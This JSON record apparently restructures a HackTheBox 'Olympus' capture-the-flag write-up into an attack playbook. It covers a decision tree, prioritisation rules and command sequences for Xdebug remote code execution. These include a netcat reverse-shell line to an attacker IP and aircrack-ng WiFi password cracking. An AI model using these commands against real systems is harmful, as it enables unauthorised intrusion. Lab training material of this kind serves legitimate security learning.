@@ -1,0 +1,818 @@
+{
+  "writeup_id": "Htb_Olympus",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_container_xdebug_rce",
+    "primary_services": [
+      "http",
+      "ssh",
+      "dns"
+    ],
+    "port_signature": "53+80+2222",
+    "service_combination": "dns+http+ssh_alt_port",
+    "os_family": "linux",
+    "environment_type": "containerized",
+    "entry_vector": "xdebug_remote_debugging",
+    "privilege_path": "web_rce_to_container_escape",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "xdebug_header_disclosure",
+      "ssh_on_port_2222",
+      "filtered_port_22",
+      "custom_ssh_banner"
+    ],
+    "environmental_clues": [
+      "apache_with_xdebug_enabled",
+      "dns_server_present",
+      "container_environment",
+      "multiple_service_layers"
+    ],
+    "similar_scenarios": [
+      "docker_breakout_challenges",
+      "multi_container_environments"
+    ],
+    "unique_aspects": [
+      "xdebug_2_5_5_version",
+      "city_of_olympia_ssh_banner",
+      "dns_wifi_cracking_elements",
+      "container_hopping_required"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Xdebug Remote Code Execution",
+        "success_reason": "Xdebug extension enabled with remote debugging accessible",
+        "prerequisite_indicators": [
+          "xdebug_header_present",
+          "php_application_running",
+          "remote_debugging_enabled",
+          "port_9000_accessible"
+        ],
+        "recognition_patterns": [
+          "Xdebug: 2.5.5 in HTTP headers",
+          "PHP application detected",
+          "callback on port 9000 when XDEBUG_SESSION cookie set",
+          "XML response with debugger protocol"
+        ],
+        "failure_modes": [
+          "xdebug_not_installed",
+          "remote_debugging_disabled",
+          "firewall_blocking_callback",
+          "xdebug_configured_for_specific_ide_only"
+        ],
+        "environmental_factors": [
+          "development_environment_in_production",
+          "default_xdebug_configuration",
+          "insufficient_network_segmentation",
+          "debug_mode_left_enabled"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "HTTP Header Analysis",
+        "success_reason": "Verbose headers revealed debugging capabilities",
+        "prerequisite_indicators": [
+          "web_application_accessible",
+          "verbose_http_headers",
+          "development_headers_present"
+        ],
+        "recognition_patterns": [
+          "Xdebug version in headers",
+          "development-specific headers",
+          "security headers with debug info",
+          "non-standard server responses"
+        ],
+        "failure_modes": [
+          "headers_stripped_by_proxy",
+          "minimal_server_configuration",
+          "production_hardening_applied"
+        ],
+        "environmental_factors": [
+          "development_server_exposed",
+          "inadequate_production_preparation",
+          "debug_mode_in_production"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "1-2 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Xdebug header in HTTP response",
+        "discovery_method": "HTTP header analysis during web enumeration",
+        "why_critical": "Enabled direct remote code execution without authentication",
+        "how_to_recognize": [
+          "Xdebug: [version] header present",
+          "PHP application indicators",
+          "development environment signs",
+          "verbose server headers"
+        ],
+        "follow_up_actions": [
+          "test_xdebug_callback_with_cookie",
+          "setup_listener_on_port_9000",
+          "craft_xdebug_session_cookie",
+          "execute_system_commands_via_eval"
+        ]
+      },
+      {
+        "discovery": "Remote debugging callback mechanism",
+        "discovery_method": "XDEBUG_SESSION cookie triggering port 9000 callback",
+        "why_critical": "Provided interactive command execution interface",
+        "how_to_recognize": [
+          "connection received on port 9000",
+          "XML debugger protocol response",
+          "base64 encoded command output",
+          "persistent debugging session"
+        ],
+        "follow_up_actions": [
+          "establish_reverse_shell",
+          "enumerate_container_environment",
+          "identify_privilege_escalation_paths",
+          "map_internal_network_structure"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_web_access",
+        "escalation_method": "xdebug_remote_debugging",
+        "why_possible": "Development debugging interface exposed in production",
+        "recognition_signs": [
+          "xdebug_header_in_response",
+          "php_application_detected",
+          "port_9000_callback_successful",
+          "eval_commands_executed"
+        ],
+        "exploitation_path": "HTTP Header Discovery → Xdebug Cookie → Port 9000 Callback → RCE"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22(filtered), 53, 80, 2222(ssh) open on Linux host",
+        "decision": "Investigate web service first due to Xdebug header presence",
+        "reasoning": "Xdebug header indicates potential RCE vulnerability with higher success rate than other services",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "dns_enumeration",
+            "when": "if web exploitation fails"
+          },
+          {
+            "option": "ssh_bruteforce_2222",
+            "when": "if no other vectors found"
+          }
+        ],
+        "success_indicators": [
+          "xdebug_header_present",
+          "php_application_confirmed",
+          "debug_callback_received"
+        ],
+        "next_decision": "attempt_xdebug_rce"
+      },
+      {
+        "step": 2,
+        "situation": "Xdebug header detected in HTTP response",
+        "decision": "Attempt Xdebug remote code execution via debug session",
+        "reasoning": "Xdebug allows remote debugging which can be exploited for RCE without authentication",
+        "confidence": 0.85,
+        "prerequisites": [
+          "xdebug_header_confirmed",
+          "port_9000_accessible"
+        ],
+        "success_indicators": [
+          "debug_session_established",
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "source_code_analysis",
+          "dns_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Xdebug RCE successful, obtained www-data shell",
+        "decision": "Enumerate container environment and look for privilege escalation paths",
+        "reasoning": "Initial shell obtained, need to escalate privileges and potentially escape container",
+        "confidence": 0.8,
+        "prerequisites": [
+          "shell_access_confirmed"
+        ],
+        "success_indicators": [
+          "container_identified",
+          "escalation_vectors_found"
+        ],
+        "failure_fallbacks": [
+          "lateral_movement",
+          "credential_harvesting"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_xdebug_succeeds": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "netcat",
+          "python_socket",
+          "custom_xdebug_exploit"
+        ],
+        "next_phase": "container_enumeration_and_escalation"
+      },
+      "if_xdebug_fails": {
+        "action": "try_alternative_web_attacks",
+        "alternatives": [
+          "directory_enumeration",
+          "parameter_fuzzing",
+          "dns_zone_transfer"
+        ],
+        "decision_criteria": "based_on_service_responses"
+      },
+      "if_shell_obtained": {
+        "action": "enumerate_environment",
+        "purpose": "identify_container_and_escalation_paths",
+        "tools": [
+          "linpeas",
+          "manual_enumeration",
+          "docker_escape_techniques"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_xdebug_when_header_present",
+        "reasoning": "high_success_rate_for_immediate_rce",
+        "applicability": "php_applications_with_xdebug_enabled"
+      },
+      {
+        "rule": "check_unusual_ssh_ports_after_web_exploitation",
+        "reasoning": "may_indicate_containerized_environment_with_multiple_services",
+        "applicability": "multiple_ssh_ports_detected"
+      },
+      {
+        "rule": "investigate_filtered_ports_after_initial_access",
+        "reasoning": "filtered_ports_may_become_accessible_from_internal_network",
+        "applicability": "filtered_ports_identified_in_initial_scan"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Xdebug Remote Code Execution",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_application",
+          "xdebug_extension_enabled",
+          "remote_debugging_enabled",
+          "callback_port_accessible"
+        ],
+        "success_indicators": [
+          "xdebug_header_present",
+          "callback_connection_received",
+          "php_code_execution_confirmed"
+        ],
+        "incompatible_with": [
+          "xdebug_disabled",
+          "remote_debugging_disabled",
+          "network_callback_blocked",
+          "non_php_application"
+        ],
+        "confidence_boosters": [
+          "xdebug_version_header",
+          "php_error_messages",
+          "development_environment_indicators"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "DNS Zone Transfer",
+        "mitre_id": "T1590.002",
+        "required_services": [
+          "dns"
+        ],
+        "required_ports": [
+          53
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "dns_server_running",
+          "zone_transfer_enabled",
+          "tcp_dns_accessible"
+        ],
+        "success_indicators": [
+          "axfr_query_successful",
+          "domain_records_returned",
+          "subdomain_enumeration_possible"
+        ],
+        "incompatible_with": [
+          "zone_transfer_disabled",
+          "dns_server_hardened",
+          "tcp_53_filtered"
+        ],
+        "confidence_boosters": [
+          "bind_version_disclosure",
+          "multiple_dns_records",
+          "internal_domain_names"
+        ],
+        "typical_success_rate": 0.15,
+        "estimated_time": "1-3 minutes"
+      },
+      {
+        "technique": "SSH Service Enumeration",
+        "mitre_id": "T1046",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22,
+          2222
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ssh_service_running",
+          "non_standard_port_usage",
+          "banner_grabbing_possible"
+        ],
+        "success_indicators": [
+          "ssh_banner_retrieved",
+          "version_information_disclosed",
+          "custom_banner_present"
+        ],
+        "incompatible_with": [
+          "ssh_disabled",
+          "banner_disabled",
+          "port_filtered"
+        ],
+        "confidence_boosters": [
+          "custom_ssh_banners",
+          "multiple_ssh_ports",
+          "version_vulnerabilities"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "1-2 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "php_xdebug_environment": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "header_indicators": [
+          "Xdebug",
+          "X-Xdebug-Profile-Filename"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "dns_server": {
+        "port_indicators": [
+          53
+        ],
+        "service_indicators": [
+          "dns",
+          "domain"
+        ],
+        "banner_indicators": [
+          "Bind",
+          "dnsmasq",
+          "PowerDNS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "ssh_service": {
+        "port_indicators": [
+          22,
+          2222
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "SSH-2.0",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "xdebug_rce",
+          "when": "xdebug_header_detected",
+          "reason": "immediate_rce_no_authentication_needed"
+        },
+        {
+          "attack": "ssh_enumeration",
+          "when": "custom_ssh_banner_detected",
+          "reason": "potential_information_disclosure"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "dns_zone_transfer",
+          "when": "dns_tcp_service_detected",
+          "reason": "low_success_rate_but_high_value_if_successful"
+        },
+        {
+          "attack": "web_directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "standard_enumeration_technique"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "time_intensive_low_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Xdebug Remote Code Execution",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl http://{target} -H \"Cookie: XDEBUG_SESSION={session_id}\"",
+            "actual_command": "curl http://10.10.10.83 -H \"Cookie: XDEBUG_SESSION=wpOCvcWXx5\"",
+            "output_pattern": "xdebug callback on port 9000",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "python_xdebug_exploit",
+            "command_template": "python xdebug_exploit.py",
+            "actual_command": "system(\"nc -e /bin/bash {attacker_ip} {port}\")",
+            "success_factors": [
+              "xdebug_enabled",
+              "remote_debugging_allowed",
+              "nc_with_e_flag"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "xdebug_header_present",
+          "php_application",
+          "remote_debugging_enabled"
+        ],
+        "success_indicators": [
+          "xdebug_header_in_response",
+          "callback_received_on_port_9000",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "xdebug_not_configured_for_remote",
+          "firewall_blocking_callback",
+          "nc_without_e_flag"
+        ],
+        "follow_up_techniques": [
+          "container_enumeration",
+          "network_discovery",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "WiFi Password Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "aircrack-ng",
+            "command_template": "aircrack-ng -e {ssid} -w {wordlist} {capture_file}",
+            "actual_command": "aircrack-ng -e Too_cl0se_to_th3_Sun -w /usr/share/wordlists/rockyou.txt captured.cap",
+            "output_pattern": "KEY FOUND!",
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          },
+          {
+            "name": "wireshark",
+            "command_template": "wireshark {capture_file}",
+            "actual_command": "wireshark captured.cap",
+            "success_factors": [
+              "wpa_handshake_present",
+              "weak_password",
+              "good_wordlist"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "wifi_capture_file_available",
+          "wpa_handshake_captured",
+          "ssid_identified"
+        ],
+        "success_indicators": [
+          "handshake_packets_present",
+          "password_cracked_successfully",
+          "credentials_provide_access"
+        ],
+        "common_failures": [
+          "no_handshake_captured",
+          "strong_password_resists_cracking",
+          "incomplete_capture"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "ssh_authentication",
+          "service_authentication"
+        ],
+        "time_investment": "10-60 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Container Network Discovery",
+        "mitre_id": "T1018",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "ifconfig",
+            "command_template": "ifconfig",
+            "actual_command": "ifconfig",
+            "output_pattern": "172.20.0.2",
+            "effectiveness_rating": 5,
+            "reliability": 1.0
+          },
+          {
+            "name": "arp",
+            "command_template": "arp -a",
+            "actual_command": "arp -a",
+            "success_factors": [
+              "container_networking",
+              "docker_environment"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "shell_access_obtained",
+          "container_environment"
+        ],
+        "success_indicators": [
+          "container_ip_identified",
+          "gateway_discovered",
+          "network_range_mapped"
+        ],
+        "common_failures": [
+          "limited_network_tools",
+          "restricted_permissions"
+        ],
+        "follow_up_techniques": [
+          "network_scanning",
+          "service_enumeration",
+          "lateral_movement"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Xdebug",
+        "use_case": "remote_code_execution",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "php_application_testing"
+        ],
+        "alternatives": [
+          "other_php_vulnerabilities",
+          "web_shells"
+        ],
+        "best_practices": [
+          "check_for_xdebug_headers",
+          "test_multiple_session_ids",
+          "use_base64_encoding_for_commands"
+        ]
+      },
+      {
+        "tool": "aircrack-ng",
+        "use_case": "wifi_password_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "low",
+        "essential_for": [
+          "wifi_security_testing"
+        ],
+        "alternatives": [
+          "hashcat",
+          "john_the_ripper"
+        ],
+        "best_practices": [
+          "ensure_handshake_captured",
+          "use_targeted_wordlists",
+          "verify_ssid_before_cracking"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "xdebug_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -sV -sC -p 80 10.10.10.83",
+            "purpose": "Identify Xdebug header",
+            "expected_output": "Xdebug: 2.5.5 header present"
+          },
+          {
+            "step": 2,
+            "command": "nc -lvnp 9000",
+            "purpose": "Listen for Xdebug callback",
+            "expected_output": "Listening on port 9000"
+          },
+          {
+            "step": 3,
+            "command": "curl http://10.10.10.83 -H \"Cookie: XDEBUG_SESSION=wpOCvcWXx5\"",
+            "purpose": "Trigger Xdebug callback",
+            "expected_output": "Xdebug connection received"
+          },
+          {
+            "step": 4,
+            "command": "system(\"nc -e /bin/bash 10.10.14.5 443\")",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Shell as www-data"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "wifi_crack_to_credentials",
+        "steps": [
+          {
+            "step": 1,
+            "command": "wireshark captured.cap",
+            "purpose": "Identify SSID in capture",
+            "expected_output": "SSID: Too_cl0se_to_th3_Sun"
+          },
+          {
+            "step": 2,
+            "command": "aircrack-ng -e Too_cl0se_to_th3_Sun -w /usr/share/wordlists/rockyou.txt captured.cap",
+            "purpose": "Crack WiFi password",
+            "expected_output": "Password discovered"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "10-45 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Olympus",
+      "difficulty": "Medium",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2018-04-21",
+      "author": "OscarAkaElvis",
+      "estimated_time": "3-4 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "dns_enumeration",
+        "wifi_cracking",
+        "container_escape"
+      ],
+      "key_vulnerabilities": [
+        "dns_zone_transfer",
+        "weak_wifi_credentials",
+        "container_misconfiguration"
+      ],
+      "environment_type": "containerized_multi_service",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "dns_attacks",
+        "wifi_security",
+        "container_security",
+        "lateral_movement"
+      ],
+      "prerequisite_knowledge": [
+        "dns_fundamentals",
+        "wifi_protocols",
+        "container_basics",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "multi_vector_attack",
+      "subcategories": [
+        "dns_exploitation",
+        "wifi_cracking",
+        "container_security"
+      ],
+      "attack_types": [
+        "information_disclosure",
+        "credential_access",
+        "lateral_movement",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_dns_configuration",
+        "strong_wifi_security",
+        "container_hardening",
+        "network_segmentation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Brainfuck",
+        "Canape",
+        "Poison"
+      ],
+      "similarity_reasons": [
+        "multi_service_environment",
+        "container_usage",
+        "complex_attack_chain"
+      ],
+      "unique_aspects": [
+        "wifi_cracking_component",
+        "dns_zone_transfer",
+        "container_hopping"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_vectors",
+        "container_complexity",
+        "non_standard_services"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T00:59:37.853721",
+    "original_file": "0xdf_writeups/Htb Olympus.md",
+    "content_length": 27459,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
